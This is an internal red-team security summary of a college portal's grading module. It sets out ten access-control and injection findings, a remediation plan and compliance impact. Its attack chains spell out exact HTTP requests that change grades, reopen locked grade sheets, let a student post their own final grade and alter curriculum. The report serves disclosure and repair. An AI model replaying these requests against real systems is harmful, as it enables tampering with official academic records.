# College Portal — Executive Security Summary
**Date:** June 6, 2026  
**Classification:** Internal — Restricted  
**Module:** College (CT / CP / Dean / ECR)  
**Reviewer:** Internal Red Team

---

## Executive Overview

The College module manages the academic records, grading lifecycle, curriculum, and scheduling for the institution's higher education programs. It is divided into four role layers: College Teacher (CT, type 18), Chairperson (CP, type 16), Dean (type 14), and the ECR (Electronic Class Record) grading pipeline.

The review found **10 security findings** (1 CRITICAL, 5 HIGH, 2 MEDIUM, 2 LOW) and **5 backend bugs**. The most severe finding is a fully unauthenticated endpoint that allows any internet visitor — without any login — to corrupt any grade record in the database through dynamic SQL column injection. The College module as a whole has systemic route protection failures: all the grade-write operations intended for teachers and deans are reachable by students and parents due to missing role middleware.

**Overall Risk Rating: CRITICAL**

---

## Risk Summary Table

| ID | Severity | CVSS | Title | Auth Required |
|---|---|---|---|---|
| C-01 | **CRITICAL** | 9.8 | Unauthenticated Grade Corruption — Dynamic Column Injection | None |
| C-02 | **HIGH** | 8.5 | Any Authenticated User Can Modify K-12 Grade Records | Login only |
| C-03 | **HIGH** | 8.6 | Unauthenticated College Student Grade Save | None (but throws 500 → needs auth) |
| C-04 | **HIGH** | 8.1 | ECR Grade Approval & Posting — No Role Check | Login only |
| C-05 | **HIGH** | 8.5 | Dean Curriculum & Student Loading — No Role Check | Login only |
| C-06 | **HIGH** | 7.5 | Unauthenticated Grade Status Submission | None |
| C-07 | MEDIUM | 7.5 | Unauthenticated Student Grade Data Exposure | None |
| C-08 | MEDIUM | 5.3 | Unauthenticated College Directory Exposure | None |
| C-09 | LOW | — | Dead Route Returns 500 | N/A |
| C-10 | LOW | — | Duplicate Route Registrations (Dean ×4, chairpersoninfo ×2) | N/A |

---

## Critical Attack Chains

### Chain A — Unauthenticated Grade Sheet Destruction (C-01)

**Threat actor:** Any internet visitor — no credentials required  
**Impact:** Any student's grade can be set to any value; HPS values can be zeroed causing division-by-zero cascades; submitted grade sheets can be reopened  
**Complexity:** Low (single HTTP request)

```
Step 1:  GET /college/subject/students?syid=1&semid=1&sectionid=5&subjid=3
         → No auth required → returns all students and their grade record IDs

Step 2:  GET /teacher/update/hps?a=<grades.id>&b=qg&c=100
         → No auth required → sets quarterly grade to 100 for any student
         
         OR: GET /teacher/update/hps?a=<grades.id>&b=submitted&c=0
         → Reopens a locked/submitted grade sheet
         
         OR: GET /teacher/update/hps?a=<grades.id>&b=wwhps0&c=0
         → Sets HPS to 0 → next grade computation divides by zero → crashes grade display
```

No login. No CSRF token needed (GET request). Chain A is the single highest-priority issue in the entire engagement.

---

### Chain B — Student Self-Approves College Final Grade (C-03 + C-04)

**Threat actor:** Any student with a valid login  
**Impact:** Student sets their own final grade to a passing value and posts it through the full approval workflow  
**Complexity:** Low–Medium

```
Step 1:  POST /login { email: "S1001", password: "<student password>" }
         → Authenticated as student

Step 2:  GET /college/student/grade/save?studid=1001&subjid=3&field=finalgrade&grade=1.0
         → Saves final grade 1.0 (highest) for their own subject
         → No teacher ownership check

Step 3:  GET /college/grade/ecr/submit?id=<headerid>&syid=1&semid=1&schedid=5&term=FINAL
         → Submits the ECR record for teacher review (any auth user)

Step 4:  GET /college/grade/ecr/approve?id=<headerid>&...
         → Approves — bypasses Chairperson role (any auth user)

Step 5:  GET /college/grade/ecr/post?id=<headerid>&...
         → Posts — bypasses Dean role (any auth user)
         → Grade is now permanently posted in the academic record
```

---

### Chain C — Anonymous K-12 Grade Manipulation (C-01 + C-07)

**Threat actor:** External attacker — no credentials  
**Impact:** K-12 basic education quarterly grades corrupted for any student  
**Complexity:** Low

```
Step 1:  GET /teacher/get/grades/<sectionid>/<quarter>
         → No auth required → returns all gradesdetail.id values for the section

Step 2:  GET /teacher/update/hps?a=<grades.id>&b=qg&c=65
         → Fails any student (65 = minimum passing grade — or below)

         GET /teacher/update/hps?a=<grades.id>&b=qg&c=100
         → Passes any student unconditionally
```

Both K-12 and college grades are reachable in a single request from outside the network.

---

### Chain D — Any Student Deletes College Curriculum (C-05)

**Threat actor:** Any authenticated user  
**Impact:** Subject removed from course prospectus → all students in that course lose the subject from their graduation checklist  
**Complexity:** Low

```
Step 1:  Log in as any portal user (student, parent, teacher, cashier)

Step 2:  GET /dean/remove/prospectussubject/1
         → Subject ID 1 removed from college prospectus
         → Any student whose graduation check depends on this subject is now "missing" a requirement

Step 3:  GET /dean/store/prospectus?subjectID=99&course=1&year=1&sem=1&units=3
         → Injects a fake subject into the prospectus
         → Students enrolled in affected course now have phantom requirement
```

---

## Affected Components

| Component | Risk | Action |
|---|---|---|
| `CPController@updatehps` | CRITICAL | Route must be gated immediately |
| `CPController@updategrades`, `updateigfg` | HIGH | Auth middleware required |
| `CTController@save_student_grade` | HIGH | Auth + teacher ownership required |
| `CTController@submit_grade_status` | HIGH | Auth middleware required |
| `CollegeECR@approve_grade`, `post_grade` | HIGH | Role middleware (`isCP`, `isDean`) required |
| All Dean route group | HIGH | `isDean` middleware required |
| All `//college_data` standalone routes | MEDIUM | Move inside `['auth']` group minimum |

---

## Compliance Impact

| Standard | Impact |
|---|---|
| **CHED Memorandum Orders** | Posted grades are official academic records. C-04 allows any user to post grades — compromises CHED reporting integrity |
| **Data Privacy Act (R.A. 10173)** | C-07/C-08 expose student grades, schedules, and teacher assignments to unauthenticated visitors |
| **Institutional Academic Integrity Policy** | Chain B demonstrates a student can alter and post their own final grade with no approval from faculty |
| **ISO/IEC 27001 A.9.4** | Broken access control across the entire College module — no least-privilege enforcement |

---

## Remediation Roadmap

### P0 — Immediate
1. **Add middleware to `/teacher/update/hps`, `/teacher/update/grades`, `/teacher/update/igfg`** — these are the most dangerous routes in the system
2. **Add middleware to `/college/student/grade/save` and `/college/student/grade/status/submit`**
3. **Add column name allowlist to `updatehps`** — even after adding auth, the dynamic column injection must be patched

### P1 — Within 1 Week
4. Add `isCP` to ECR approve route; add `isDean` to ECR post route
5. Add `isDean` middleware to entire Dean route group
6. Move all `//college_data` comment-block routes inside an `['auth']` group

### P2 — Within 1 Month
7. Add teacher-to-schedule ownership check in `save_student_grade`
8. Replace `"fsfsdf"` string with proper JSON response in `updategrades`
9. Remove dead route `/college/student/grade/status`
10. Clean up 4× duplicated Dean route registrations

---

## Finding Count by Severity

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 5 |
| Medium | 2 |
| Low | 2 |
| Bugs | 5 |
| **Total** | **15** |

---

*End of College Portal Executive Summary*
